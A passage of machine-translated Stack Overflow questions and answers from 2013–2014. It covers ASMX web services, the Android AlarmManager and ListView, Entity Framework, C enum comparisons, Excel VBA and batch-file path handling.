    }
    [WebMethod]
    public string Method2(int? x) {
        return "it worked";
    }
} 
```

如果在调用服务时缺少参数，则产生的错误是我以前见过的错误：

> System.IndexOutOfRangeException：索引超出了数组的范围。在 System.Web.Services.Protocols.HttpServerType..ctor(Type type) 在 System.Web.Services.Protocols.HttpServerProtocol.Initialize() 在 System.Web.Services.Protocols.ServerProtocolFactory.Create(Type type, HttpContext context, HttpRequest 请求、HttpResponse 响应、Boolean& abortProcessing)

此外，如果第一个方法返回 void，这似乎只会中断，所以这也可以正常工作：

```
[WebService(Namespace = "http://tempuri.org/")]
[WebServiceBinding(ConformsTo = WsiProfiles.BasicProfile1_1)]
public class WebService : System.Web.Services.WebService {
    [WebMethod]
    public string Method1(int x) {
        return "works again";
    }
    [WebMethod]
    public string Method2(int? x) {
        return "it worked";
    }
} 
```

有什么想法吗？这发生在使用 3.5 和 4.0 作为目标框架时。

编辑：只是为了抢占这些方面的进一步答案/评论......我不是在寻找关于最佳实践、替代解决方案、asmx 在服务环境中的位置、wcf 等的建议。这是我在调试时遇到的东西遗留应用程序中的一个问题，我没有编写并且已经修复，我有兴趣找出我在此处概述的特定行为的原因。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-11-14T06:55:31.320

@heisenberg，您是否从调用 web 方法的应用程序中传递了 null 。我尝试的示例在 vs2010 上运行良好。在它下面是我尝试过的代码。

示例代码：

```
 protected void Button1_Click(object sender, EventArgs e)
    {
        WebService1 objws = new WebService1();
        objws.voidMethod(5);
        Label1.Text = objws.HelloWorld(5);
    } 
```

服务 ASMX 代码

```
[WebService(Namespace = "http://tempuri.org/")]
[WebServiceBinding(ConformsTo = WsiProfiles.BasicProfile1_1)]
public class WebService1 : System.Web.Services.WebService
{
    [WebMethod]
    public string HelloWorld(int? x)
    {
        if (x != null)
        {
            return x.ToString();
        }
        return "Hello World";
    }

    [WebMethod]
    public void voidMethod(int x)
    {

    }
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-04-10T07:14:10.300

我试过你的代码，它正在工作。尽管调试不起作用，但会产生错误。

我认为它正在发生，因为 Nullable int 不是原始类型。请参阅服务的 WSDL 描述“测试表单仅适用于以原始类型作为参数的方法”。

我想你面临的问题不是因为 Nullable int。

```
[WebService(Namespace = "http://tempuri.org/")]

[WebServiceBinding(ConformsTo = WsiProfiles.BasicProfile1_1)]

[System.ComponentModel.ToolboxItem(false)]

public class WebService1 : System.Web.Services.WebService
{
    [WebMethod]
    public void Method1(int x)
    {
        // i'm good
    }
    [WebMethod]
    public string Method2(int? x)
    {
        return "it worked";
    }
} 
```

网站代码：

```
namespace Helper
{
    public partial class _Default : System.Web.UI.Page
    {
        protected void Page_Load(object sender, EventArgs e)
        {
            ServiceReference1.WebService1SoapClient web = new ServiceReference1.WebService1SoapClient();
            web.Method1(5);

            string x = web.Method2(5);
        }
    }
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-03-05T06:02:54.197

它可能发生的原因可能是您尝试将相同的 X 发送到这两种方法，尽管它们没有采用相同的类型？

因为一个是可以为空的，而另一个不是。

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2013-04-02T23:52:39.150

有必要`Nullable (?)`在您的解决方案中使用吗？我认为您可以实现一个非常简单的逻辑，例如：“如果我收到一个空字符串，那么我有一个 Null 值，或者如果我收到一个“Null”字符串值，那么我需要使用一个 Null 对象”，并且将来考虑使用 WCF 的`Nullable-?`方法。

另一方面，我建议您将所有 void 方法更改为带有 word 的字符串值`"ok"`。我认为“一个请求应该有一个响应”。

# android - AlarmManager 显示无论我什么时间

> ID：15772813
> 
> 赞同：1
> 
> 时间：2013-04-02T19:35:41.737
> 
> 标签：android, alarmmanager, alarm, dayofweek

我设法让代码运行，但它不能正常工作。我已经在一个确切的时间放置了一个 AlarmManager，显示一个文本，但问题是它只是在我按下输入按钮的那一刻出现，无论我介绍什么时间。

编码：

```
final TimePicker desde = (TimePicker) findViewById(R.id.timePicker1);
        int desdeHora = desde.getCurrentHour();
        int desdeMinuto = desde.getCurrentMinute();
        Calendar desde1 = Calendar.getInstance();
        desde1.set(Calendar.DAY_OF_WEEK, 3); //MIRAR ESTE 1 SIGNIFICA DOMINGO, 2 LUNES, 3 MARTES
        desde1.set(Calendar.HOUR_OF_DAY,desdeHora);
        desde1.set(Calendar.MINUTE,desdeMinuto);

        Intent intent = new Intent(this, Alarma.class);
           PendingIntent pendingIntent = PendingIntent.getBroadcast(this, 0, intent, 0);
           AlarmManager alarmManager = (AlarmManager) getSystemService(ALARM_SERVICE);
           alarmManager.setRepeating(alarmManager.RTC, (desde1.getTimeInMillis() - System.currentTimeMillis()) , 604800000, pendingIntent); 
```

抱歉，如果您因为我在用西班牙语编程而不懂某些东西，请问您是否不懂某些东西。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-02T20:15:53.677

尝试

```
alarmManager.setRepeating(alarmManager.RTC, (desde1.getTimeInMillis()) , 604800000, pendingIntent); 
```

代替

```
alarmManager.setRepeating(alarmManager.RTC, (desde1.getTimeInMillis() - System.currentTimeMillis()) , 604800000, pendingIntent); 
```

顺便问一下，604800000 是干什么用的？

# .net - 实体框架代码优先：从带有鉴别器的表中选择数据

> ID：15772814
> 
> 赞同：6
> 
> 时间：2013-04-02T19:35:41.767
> 
> 标签：.net, entity-framework, ef-code-first

首先抱歉，如果我的标题不清楚，但我确实很难用英语把它写成简单的句子:)。

假设我有一个管理人员和超级英雄的网站，我有 2 个类：

```
 public class Person
    {      
        [Key]
        public int PersonId { get; set; }

        [MaxLength(100)]
        public string Name { get; set; }    
    }

  public class SuperHero:Person
    {    
        [MaxLength(100)]
        public string SuperHeroName { get; set; }
        public virtual ICollection<SuperPower> SuperPowers{ get; set; }
    } 
```

在我的数据库中，我有这个：

第 1 个人：ID = 1 名称 =“Alex Flimster” 鉴别器 =“人”

第 2 个人：ID = 2 Name="Bruce Wayne" discriminator="SuperHero" SuperHeroName="Batman"

我知道我是否这样做：

```
var test = from Context.Person select p; 
```

我得到每个人，英雄与否。

如果我只想要英雄，我会这样做：

```
var test = from Context.Person.OfType<SuperHero>() select p; 
```

我的问题是：我如何只得到那个人？

```
var test = from Context.Person.OfType<Person>() select p; 
```

将返回与第一次测试相同的结果。

**编辑** 我想我的问题并不完全清楚。假设我有 200 个人，除此之外还有 10 个超级英雄。我需要一个查询，该查询将返回所有只是 person 而没有任何可能的继承类的 Person。（假设我有另一个类 'VideoGame Hero' 也继承自 person。我需要一个简单的查询，它只是 person 而不是其他类）

谢谢！

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2013-04-02T19:42:11.337

试试这个

```
from p in Context.Person
where !(p is SuperHero)
select p 
```

或者流利的

```
Context.Person.Where(p => !(p is SuperHero)) 
```

更新：SQL 将如下所示：

```
SELECT 
[Extent1].[Discriminator] AS [Discriminator], 
[Extent1].[PersonId] AS [PersonId], 
[Extent1].[Name] AS [Name], 
[Extent1].[SuperHeroName] AS [SuperHeroName]
FROM [dbo].[Person] AS [Extent1]
WHERE ([Extent1].[Discriminator] IN (N'SuperHero',N'Person')) 
      AND ([Extent1].[Discriminator] <> N'SuperHero') 
```

# r - 在 R 中使用 LIMMA 时使用的数据格式

> ID：15772815
> 
> 赞同：0
> 
> 时间：2013-04-02T19:35:41.983
> 
> 标签：r, bioconductor, limma

有人可以给我一个小例子，说明我导入 LIMMA 的微阵列数据在导入 R 时应该是什么样子？

我正在尝试从微阵列样本中破译差异调节的基因。谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-03T08:08:13.353

一个带有标准化表达水平的标签（或其他）分隔文件，另外还有一个带有探针组 ID（或其他基因标识符）的列和一个定义样本的标题 - 一般而言。

要获得所需代码的示例，我建议您检查 geo2r 生成的脚本（可从任何 GEO 数据集访问）并阅读 limma 小插图。

# android - 在 Android ListView 中包含 MySQL 表中的行 ID（对于每个列表项）

> ID：15772816
> 
> 赞同：0
> 
> 时间：2013-04-02T19:35:46.823
> 
> 标签：android, database, android-listview, rowid

当我从数据库中获取信息（我正在使用`MySQL`）时，我还想获取`id`该行的 并以某种方式将其分配给“listView”的每一行。

例如，假设有一个名为`fruit`. `fruit_id`16 是`orange`. 当`listView`显示水果列表并且用户单击显示橙色的行时，我希望能够访问该`fruit_id`行的（16）。但我不确定在哪里“隐藏”它。

做一些初步研究，似乎有多种方法可以做到这一点。最简单的可能是使用 a `tag`，这是最好的方法吗？如果是这样，你怎么能分配`id`给它？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-02T20:07:26.200

如果您使用 an`ArrayAdapter`来支持您的`ListView`，那么@jaibatrik 的建议绝对是一个好建议。但是，如果您使用的是`CursorAdapter`，则利用 . 的返回值可能更容易[`getItemId()`](http://developer.android.com/reference/android/widget/Adapter.html#getItemId%28int%29)。

默认情况下， a将在您提供`CursorAdapter`的名称中查找列，并在您单击项目时将其作为值返回：`"_id"``Cursor``id`

```
onItemClick(AdapterView<?> parent, View view, int position, long id) 
```

最后一个值将包含光标项的 id。您还可以覆盖此行为并让它返回您在`Cursor`.

对于 an 也是如此`ArrayAdapter`：默认情况下，它将返回项目在数组中的位置作为唯一 id。但是，您可以通过覆盖该方法轻松地使其返回`fruit_id`每个项目。然后它将`onItemClick(...)`直接传递，这样您就可以（再次）在那里检索它。

* * *

> 我的问题是，如果我抓取例如 item_id （不仅仅是 item），我应该将 item_id 放在 listView 行中的哪里（在 Android 端）？

拥有代表您在列表中可视化的数据的对象的美妙之处在于，您已经拥有了使其工作的所有成分。让我们`Fruit`以@jaibatrik 给出的示例为例，并为此示例添加一个 getter：

```
class Fruit {
    private int fruit_id;
    private String fruit_name;

    // Constructors

    // Getters and Setters
    public int getId() { return fruit_id; }
} 
```

在您描述的评论中，您从数据库中检索水果数据并将其填充到列表中：

```
List<Fruit> fruits = ... 
```

该列表应该是支持您的`ArrayAdapter`. 更具体地说，由于它是一个类型化的类，因此您应该有一个`ArrayAdapter<Fruit>`实例，将其设置为`ListView`.

现在，假设您有一个`OnItemClickListener`针对 的集合`ListView`，只要用户点击一个项目，它就会触发。使用传递给回调的参数，您可以检索与所选位置关联的项目：

```
@Override public void onItemClick(AdapterView<?> parent, View view, int position, long id) {
    Fruit fruit = (Fruit) parent.getItemAtPosition(position);
    int fruit_id = fruit.getId();
    ...
} 
```

检索到对象后，您可以对它保存的数据做任何您喜欢的事情。无需针对行视图显式设置 id，因为它应该已经是支持`ListView`.

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-02T19:48:42.090

创建一个`class`命名的水果。

```
class Fruit {
    private int fruit_id;
    private String fruit_name;

    // Constructors

    // Getters and Setters
} 
```

使用 an`ArrayAdapter<Fruit>`作为`ListAdapter`您的`ListView`. 然后在`ListView`'s处`onItemClickListener`，获取 Fruit 对象并获取其 id。

# html - 浮动中的 CSS 和浮动

> ID：15772820
> 
> 赞同：1
> 
> 时间：2013-04-02T19:36:01.950
> 
> 标签：html, css, css-float

有谁知道如何在以下示例中并排放置两个重复元素：

```
.thumbnail {
  float: left;
  width: 30px;
  border: 1px solid #999;
  margin: 0 15px 15px 0;
}
.clearboth { clear:both; }

<!-- repeating element -->
<div class="thumbnail">1A</div>
<div class="thumbnail">1B</div>
<div class="thumbnail">1C</div>
<br class="clearboth">
<div class="thumbnail">2A</div>
<div class="thumbnail">2B</div>
<div class="thumbnail">2C</div>
<br class="clearboth">

<!-- repeating element -->
<div class="thumbnail">1A</div>
<div class="thumbnail">1B</div>
<div class="thumbnail">1C</div>
<br class="clearboth">
<div class="thumbnail">2A</div>
<div class="thumbnail">2B</div>
<div class="thumbnail">2C</div>
<br class="clearboth"> 
```

诀窍是我已经在使用 float 和 clear 属性来单独设置每个重复元素的样式。但是当在浮动元素中嵌套浮动元素时，它不起作用。

**[jsfiddle](http://jsfiddle.net/7B9HU/)**

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-02T19:46:38.267

看看这个

```
<!-- repeating element -->
<div id="first">
<div class="thumbnail">1A</div>
<div class="thumbnail">1B</div>
<div class="thumbnail">1C</div>
<br class="clearboth">
<div class="thumbnail">2A</div>
<div class="thumbnail">2B</div>
<div class="thumbnail">2C</div>
<br class="clearboth">
</div>    
<!-- repeating element -->
<div id="second">    
<div class="thumbnail">1A</div>
<div class="thumbnail">1B</div>
<div class="thumbnail">1C</div>
<br class="clearboth">
<div class="thumbnail">2A</div>
<div class="thumbnail">2B</div>
<div class="thumbnail">2C</div>
<br class="clearboth">
</div> 
```

CSS 去

```
.thumbnail {
float: left;
width: 30px;
border: 1px solid #999;
margin: 0 15px 15px 0;
}
.clearboth { clear:both; }

#first{float:left;}
#second{float:left;} 
```

# excel - 将名称排序到 VBA 中的相应列中

> ID：15772821
> 
> 赞同：0
> 
> 时间：2013-04-02T19:36:05.687
> 
> 标签：excel, vba

我有一个数据表。假设“A”列有很多品种的狗：Lab、Beagle、Golden 和 Poodle。

“B”列有他们的名字。有很多狗都是由这四个品种组成的，都有不同的名字。

“C”列有它们的位置：纽约、德克萨斯、路易斯安那和佛罗里达

我想做的是编写一个脚本，在“A”列中搜索所有住在纽约的实验室。一旦脚本找到这些狗，它就会获取它们的名字，并将它们的名字放在单独的工作表的列中。

我需要为所有的狗做到这一点。单独的工作表应该有纽约、德克萨斯、路易斯安那和佛罗里达的清单，下面有所有狗的名字。我计划根据品种对狗名进行颜色编码。

我在想我可以使用这种`Find`方法，但是老实说，我没有过多地使用 VBA，而且我的谷歌搜索也不太成功。谢谢你的帮助

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-02T22:00:53.097

Try something like this. Tweak as needed.

```
Option Explicit

Sub TestDogs()
Dim dogBreed As String
Dim dogName As String
Dim dogLoc As String
Dim rngFound As Range
Dim wsMaster As Worksheet
Dim wsNew As Worksheet
Dim rng As Range
Dim arrDogs() As String
Dim i As Long

Set wsMaster = Worksheets("List") '<modify as needed.'
wsMaster.Activate
Range("A1").Activate
dogBreed = InputBox("Enter the breed", "Dog Breed", "Lab")
dogLoc = InputBox("Enter the location", "Dog location", "New York")

Set rng = Range("A1", Range("a1").End(xlDown))
Range("A1").Activate
Do
    'use the .Find method to look for dog breed in column A'

    Set rngFound = rng.Find(What:=dogBreed, After:=ActiveCell, LookIn:= _
        xlFormulas, LookAt:=xlWhole, SearchOrder:=xlByRows, SearchDirection:= _
        xlNext, MatchCase:=True, SearchFormat:=False)

    If Not rngFound Is Nothing Then
        rngFound.Activate
        'Check to see if the Location matches:'
        If rngFound.Offset(0, 2).Value = dogLoc Then
            dogName = rngFound.Offset(0, 1).Value
            'If so, then add to the array'
            ReDim Preserve arrDogs(i)
            arrDogs(i) = dogName
            i = i + 1
            If i >= Application.WorksheetFunction.CountIf(rng, dogBreed) - 1 Then Exit Do
        End If
    Else: Exit Do
    End If

'Loop, the counter variable "i" will exit this loop when necessary.
Loop

If UBound(arrDogs) >= 0 Then
    'Add a new sheet if any matches were found
    Set wsNew = Sheets.Add(After:=wsMaster)

    With wsNew
        'Give the sheet a meaningful name.'
        .Name = Left(dogBreed & " - " & dogLoc, 31)
        'Print out the dog names on the new sheet'
        .Range("A1", .Range("A1").Offset(UBound(arrDogs), 0)).Value = WorksheetFunction.Transpose(arrDogs)
    End With
Else:
    MsgBox "No dogs matching criteria [Breed =" & dogBreed & "] and [Location =" & dogLoc & "]", vbInformation

End If
End Sub 
```

# android - 如何使用 soundPool 知道声音何时播放完毕

> ID：15772825
> 
> 赞同：0
> 
> 时间：2013-04-02T19:36:13.333
> 
> 标签：android, soundpool

我`sound pool`用来播放短声音文件`android`，但我想播放声音，例如，如果我单击一个按钮播放声音并再次单击该按钮，我不想播放声音只要它已经在玩了。如何 ？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-02T20:26:46.593

看起来您应该使用 MediaPlayer 类而不是 soundpool 来实现此结果，并结合 OnClickListener。

一个简单的 StackOverflow 搜索返回以下内容：

*   [媒体播放器](https://stackoverflow.com/questions/4319838/how-do-i-know-if-a-sound-is-finished-playing-in-android)

# java - 在构造函数中使用递归是不好的做法吗？

> ID：15772827
> 
> 赞同：4
> 
> 时间：2013-04-02T19:36:14.267
> 
> 标签：java, recursion, van-emde-boas-trees

我正在实现 van Emde Boas 树，并且遇到了在构造函数中使用递归非常有用的情况。

当我在树中创建根节点时，该节点将具有指向许多其他节点的指针，这些节点将指向许多其他节点，依此类推。即使这些是用空数据初始化的，我仍然希望它们都在那里。

编辑：在回答评论时，我认为这可能是不好的做法，因为我们在分配内存时总是需要小心。在这种情况下，用户可能不知道分配新的此类节点可能产生的影响，因此他们可能会分配比预期更多的内存？除此之外，我认为在构造函数中分配内存似乎很奇怪/危险。

代码递归地创建新节点，直到创建完整的树。这是一个不好的做法吗？如果是这样，有没有更好的方法在 Java 中做到这一点？

```
//Constructor
public VEBNode(int universeSize)
{
    this.universeSize = universeSize;
    min = vEBTree.NULL;
    max = vEBTree.NULL;

    if(universeSize <= 2)
    {
        summary = null;
        cluster = null;
    }
    else
    {
        int childUnivereSize = (int)Math.sqrt(universeSize);

        summary = new VEBNode(childUnivereSize);
        cluster = new VEBNode[childUnivereSize];

        for(int i = 0; i < childUnivereSize; i++)
        {
            cluster[i] = new VEBNode(childUnivereSize);
        }
    } 
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-02T20:02:45.997

您通常会违反 SOLID 原则的“D”：

**依赖倒置原则**

> 该原则规定：
> 
> A. 高级模块不应该依赖于低级模块。两者都应该依赖于抽象。B. 抽象不应依赖于细节。细节应该取决于抽象。

实际上，您的构造函数实例化了一个具体的类：它本身 => 不够灵活且难以测试。（模拟的递归？:)）

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-02T19:40:08.803

我想不出一个可以被认为是不好的做法的案例。

构造函数旨在完全构建一个类的实例，所以如果需要递归，使用它并没有错。

但是，为了清楚起见，您可能希望保留一个简单的构造函数并在另一个（私有）方法中实现递归......但这取决于您。当然，如果你把递归放在另一个方法中，你可以从你的构造函数中调用它。结果是一样的，但代码可能看起来更干净、更清晰。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-02T19:39:59.187

通常，可能会建议反对在构造函数中执行资源密集型工作。

如何将“构造函数”与“构建整棵树”分开？

另外，你打算有子类吗？

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-02T19:41:38.573

构造函数是您生成对象的地方。它应该简单直接。

如果您需要使用一些值初始化对象 - 将这些值的计算外部化。

据我了解，从构造函数调用方法是一种不好的做法。我会使用一个委托类，它封装了所有逻辑。

将所有复杂的逻辑放在一个单独的服务类中（但同样 - 不是在构造函数中）并使用 - 将所有计算委托给该服务类。

构造函数对于保存复杂（包括递归）逻辑来说太敏感了。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-04-02T19:42:57.160

如果你要子类化这个类——那么递归会给你带来很多痛苦，因为你将无法覆盖这个构造函数，以便创建子类的实例。

# android - 错误外部存储android

> ID：15772835
> 
> 赞同：0
> 
> 时间：2013-04-02T19:36:40.720
> 
> 标签：android, external, sd-card

我正在尝试使用以下代码从外部存储中获取图像：

```
public class MyStorage extends Activity{

public static boolean mExternalStorageAvailable;
public static boolean mExternalStorageWriteable;

public static void checkAvailability(){
    //Checking media availability
    String state = Environment.getExternalStorageState();

    if (Environment.MEDIA_MOUNTED.equals(state)) {
        // We can read and write the media
        mExternalStorageAvailable = mExternalStorageWriteable = true;
    } else if (Environment.MEDIA_MOUNTED_READ_ONLY.equals(state)) {
        // We can only read the media
        mExternalStorageAvailable = true;
        mExternalStorageWriteable = false;
    } else {
        // Something else is wrong. It may be one of many other states, but all we need
        //  to know is we can neither read nor write
        mExternalStorageAvailable = mExternalStorageWriteable = false;
    }
}

public static ArrayList<String> getFiles(){
    checkAvailability();
    ArrayList<String> result = new ArrayList<String>();
    if(mExternalStorageAvailable){
        File folder = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES);
        String basePath = folder.toString();
        result = listDirectory(folder, basePath);
    }
    return result;
}

private static ArrayList<String> listDirectory(File folder, String basePath){
    String[] list = folder.list();
    ArrayList<String> result = new ArrayList<String>();
    for (int i = 0; i < list.length; i++) {
        File test = new File(basePath+"/"+list[i]);
        if(test.isDirectory()){
            result.addAll(listDirectory(test,basePath+"/"+list[i]));
        }else{
            result.add(basePath+"/"+list[i]);
        }
    }
    return result;
}
} 
```

我使用这个对象：

```
for(int i = 0; i<result.size(); i++){
            String filename = result.get(i);
            String filenameArray[] = filename.split("\\.");
            String extension = filenameArray[filenameArray.length-1];
            if(extension.equals("jpg") || extension.equals("JPG") || extension.equals("png") || extension.equals("PNG") ){
                //get file
                File file = new File(result.get(i));

                Bitmap myBitmap = BitmapFactory.decodeFile(file.getAbsolutePath());
                myBitmap = MyImages.resizeImage(100,myBitmap,2);

                imageViewList.add(new ImageView(this));
                imageViewList.get(imageViewList.size()-1).setImageBitmap(myBitmap);

                layout.addView(imageViewList.get(imageViewList.size()-1));

                LinearLayout.LayoutParams params = (LinearLayout.LayoutParams)imageViewList.get(imageViewList.size()-1).getLayoutParams();
                params.setMargins(0, 30, 22, 0);
                imageViewList.get(imageViewList.size()-1).setLayoutParams(params);

                //add onclick listner on the image
                imageViewList.get(imageViewList.size()-1).setOnClickListener(new OnClickListener() {
                    public void onClick(View arg0) {
                        //remove all backgrounds
                        for(int i=0; i<imageViewList.size();i++){
                            imageViewList.get(i).setBackgroundResource(android.R.color.transparent);
                        }
                        //set the border
                        arg0.setBackgroundResource(R.drawable.border_image_follow);

                        Drawable d = ((ImageView) arg0).getDrawable();
                        Bitmap bitmap = ((BitmapDrawable)d).getBitmap();
                        ByteArrayOutputStream stream = new ByteArrayOutputStream();
                        bitmap.compress(Bitmap.CompressFormat.JPEG, 100, stream);
                        byte[] bitmapdata = stream.toByteArray();
                        image = Base64.encodeToString(bitmapdata,0);

                    }
                });
            }
        } 
```

我有一个错误，但我无法调试它。当我处于调试模式时，我的 sd 卡已卸载，因此我无法访问存储，但是当我正常运行应用程序时，sd 卡已安装并且我可以访问存储，但我有一个错误。

有没有办法在安装我的 sd 卡的情况下进行调试？

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-02T20:00:56.633

关闭设备上的 USB 大容量存储模式

# c - 为什么直接比较两个枚举时会出错？

> ID：15772839
> 
> 赞同：13
> 
> 时间：2013-04-02T19:36:57.907
> 
> 标签：c, gcc, enums, comparison, integer

我有一些代码要移植到一个新平台，它开始给我一个关于比较来自两个不同枚举器列表的两个枚举器的错误。我很困惑为什么它给我一个错误。

C 规范（6.7.2.2）的枚举规范部分指出：

> 枚举器列表中的标识符被声明为具有 int 类型的常量，并且可以出现在任何允许的地方。^(127))带有 = 的枚举器将其枚举常量定义为常量表达式的值。如果第一个枚举数没有 =，则其枚举常数的值为 0。

所以我应该能够使用与 int 常量相同的枚举成员。在这个小示例程序中：

```
enum first {
  a,
  b
};

enum second {
 c,
 d
};

int main(){
    enum first myf = a;
    enum second mys = c;

    if(myf == mys)
        printf("same value\n"); 
    return 0;
} 
```

编译时`gcc -Wall -Werror`我收到消息：

> 错误：'enum first' 和 'enum second' 之间的比较 [-Werror=enum-compare]

我知道，如果我对两者`myf`和`mys`as`int`进行类型转换，编译器会很高兴，就像我可以使用 and`int`的值设置几个 s`myf`并`mys`进行比较一样；但为什么我必须做*这些*来摆脱警告？为什么这个警告首先存在？这样做肯定有一些我没有看到的危险。

* * *

**注意：**
我已经阅读了关于这个 enum-compare 标志的 gcc 文档，但它并没有说明什么：

> **-Wenum-compare**
> 警告不同枚举类型的值之间的比较。在 C++ 中，条件表达式中的枚举不匹配也会被诊断出来，并且默认情况下会启用警告。在 C 中，此警告由 -Wall 启用。

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2013-04-02T19:44:22.240

由于标准合规性问题，这不是警告，它是“这似乎不正确”的警告之一。如果您考虑枚举的典型用途，那么在许多情况下进行这样的比较并没有多大意义。例如：

```
enum Day {
  Sunday,
  Monday,
  Tuesday,
  Wednesday,
  Thursday,
  Friday,
  Saturday
};

enum Month {
  January,
  February,
  March,
  April,
  May,
  June,
  July,
  August,
  September,
  October,
  November,
  December
};

enum Day day = Wednesday;
enum Month month = April; 

if (day == month) { ... } 
```

这评估为真，但一般来说，比较没有多大意义。正如您所指出的，如果您知道您的意思，则类型转换将说服编译器。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-02T19:42:35.497

它在警告您，因为您打开了警告标志。标志描述没有解释它为什么存在，但假设它的存在可能是安全的，以防止不同枚举类型之间的意外比较，因为这*通常*是一个错误。

此外，您可以使用与 int 常量相同的枚举值是正确的。如果你说`if (myf == c)`那么它很可能不会发出警告（我说很可能是因为我没有尝试过，而且 GCC 老实说可以用那个警告做它想做的任何事情，但从技术上讲`c`它只是一个积分常数并且不携带类型`enum second`）。但相反，您是在显式比较不同枚举类型的两个值。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-04-02T19:56:28.143

`if((int)myf == (int)mys)`

那应该这样做。但这是一种肮脏的做法，只有在两个枚举都是同一组的不同“版本”时才使用它，就像新的枚举最后会包含新的关键字一样。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-04-02T19:49:56.950

它是一个警告，但是当您使用 -Wall -Werror 进行编译时，所有警告都被视为错误 Rest 您可以在类似的问题中找到一些东西。

[比较两个不同的枚举时是否有正确的方法来避免警告？](https://stackoverflow.com/questions/486555/is-there-a-correct-way-to-avoid-warnings-when-comparing-two-different-enums)

带着敬意

他的

# ios - 从 UIView 为标签设置文本

> ID：15772842
> 
> 赞同：0
> 
> 时间：2013-04-02T19:37:07.020
> 
> 标签：ios, cocoa-touch, uikit

我有视图控制器和自定义 UIView。我不想从 UIView 将文本设置为标签，但我只能从控制器访问此标签。

我怎样才能访问这个控件？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-02T19:45:18.273

使标签成为控制器的属性，controllerInstance.label 是您的标签实例

更新

自定义视图是视图控制器的子视图时的条件，您可以调用`customView.superview`并从那里到达您的标签，为标签`viewWithTag`设置唯一的标签值

另一种方法是设置一个委托并将值传递给superview并将其设置在那里

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-03T12:52:06.063

您应该使用标签的 tag 属性。然后在视图上使用 viewWithTag: 方法来检索特定标签。

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2013-04-03T12:45:37.220

您可以在 customView 中有一个较弱的属性并指向控制器，然后在控制器中添加一个方法，该方法将字符串作为参数并设置标签的文本。

# android - 如何处理互联网连接中断？

> ID：15772843
> 
> 赞同：4
> 
> 时间：2013-04-02T19:37:15.127
> 
> 标签：android, android-asynctask

我的应用程序从网络下载数据并将其显示给用户。为了防止由于没有互联网连接导致的应用程序崩溃，我实现了在开始下载之前检查是否有一个功能。我不知道如何处理下载过程中连接断开的情况（在 AsyncTask 中）。`Catch`ing Exepctions 在我的情况下不起作用:(如果有任何想法或教程链接，请与它分享。提前致谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-02T19:54:10.410

希望这会有所帮助。无论您执行下载的任何活动都应该创建一个可以处理连接状态通知的 BroadcastReceiver。然后您将收到连接已断开的通知，并且可以更优雅地处理它......就像等待连接恢复的通知并重新开始下载：

```
private BroadcastReceiver mConnReceiver = new BroadcastReceiver() {
    @Override
    public void onReceive(Context context, Intent intent) {
        boolean missingConnection = intent.getBooleanExtra(ConnectivityManager.EXTRA_NO_CONNECTIVITY, false);
        String reason = intent.getStringExtra(ConnectivityManager.EXTRA_REASON);

        // do whatever you need to based on current network state
    } 
```

这个页面也有很好的信息：http: [//thiranjith.com/2011/03/31/how-to-monitor-network-connectivity-in-android/](http://thiranjith.com/2011/03/31/how-to-monitor-network-connectivity-in-android/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-02T19:52:05.370

`AsyncTask`您可以在另一个线程之外或在另一个线程中定期检查连接断开。然后，如果连接断开，您可以通过调用取消 AsyncTask `cancel()`。

# batch-file - 批处理 - 区分文件和路径？

> ID：15772845
> 
> 赞同：0
> 
> 时间：2013-04-02T19:37:19.327
> 
> 标签：batch-file

```
@echo off
set /p UserInput= What file would you like to hide?

cd %UserInput% 
```

所以我想制作一个批处理文件，在运行时询问用户一个文件，它将隐藏在一个随机文件夹的迷宫中。让我解释。

假设我输入`C:\Program Files\Steam\butts.exe`

它会在其中创建一个新目录`C:\Program Files\Steam`

这就是我卡住的地方。我如何找到`C:\Program Files\Steam`它`C:\Program Files\Steam\butts.exe`？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-02T20:16:26.007

尝试这个：

```
@echo off&setlocal 
for %%i in ("C:\Program Files\Steam\butts.exe") do set "steampath=%%~dpi"
:: remove last backslash
echo %steampath:~0,-1% 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-02T20:09:51.540

哈！最快和最简单的方法就是`\..`在末尾添加一个。例如，在我的桌面上，我有一个名为`weather.xml`. 如果我这样做：

```
dir c:\users\me\Desktop\weather.xml\.. 
```

...我最终得到了我的桌面的目录列表。:)

所以你可以完成你所需要的

```
cd %UserInput%\.. 
```

否则，您可以将路径传递给`for`循环或`call :label`子例程以结束`%%~dpX`. `help for`有关详细信息，请参阅和的最后几页`help call`。

* * *

如果您想变得更 hacksier，而不是要求用户输入`path\to\file`to set `%UserInput%`，您可以使用`powershell`启动一种`File... Open`文件选择器。有关详细信息，请参阅[此答案](https://stackoverflow.com/a/15658703/1683264)。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-02T20:20:57.267

您可以使用此批次

```
@echo off
set /p UserInput=What file would you like to hide?
